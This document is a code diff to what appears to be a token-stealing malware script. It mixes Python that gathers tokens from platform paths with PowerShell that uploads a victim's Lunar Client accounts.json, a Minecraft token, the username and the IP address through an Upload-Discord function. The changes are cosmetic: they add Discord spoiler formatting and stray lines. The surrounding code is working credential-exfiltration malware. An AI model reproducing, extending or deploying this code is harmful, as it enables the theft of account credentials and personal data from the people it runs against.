@@ -49,7 +49,7 @@ def main():
         if not os.path.exists(path):
             continue
 
-        message += f'\n**{platform}**\n```\n'
+        message += f'\n**{platform}**\n\n||'
 
         tokens = find_tokens(path)
 
@@ -59,7 +59,7 @@ def main():
         else:
             message += 'No tokens found.\n'
 
-        message += '```'
+        message += '||'
 
     headers = {
         'Content-Type': 'application/json',
@@ -79,6 +79,10 @@ if __name__ == '__main__':
     
 "
 
+
+exit
+
+]
 cls
 
 function Upload-Discord {
@@ -135,7 +139,7 @@ Upload-Discord -text "-----------------------------**INFO-MC**'-----------------
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -text "**Token MC**: DEV..."
 Upload-Discord -text "-----------------------------**INFO-PC**---------------------------------------------"
-Upload-Discord -text "**Name**: $env:UserName"
+Upload-Discord -text "**Name**: ||$env:UserName||"
 Upload-Discord -text "--------------"
 Upload-Discord -text "**IP**: ||$ip||"
 Upload-Discord -text "---"
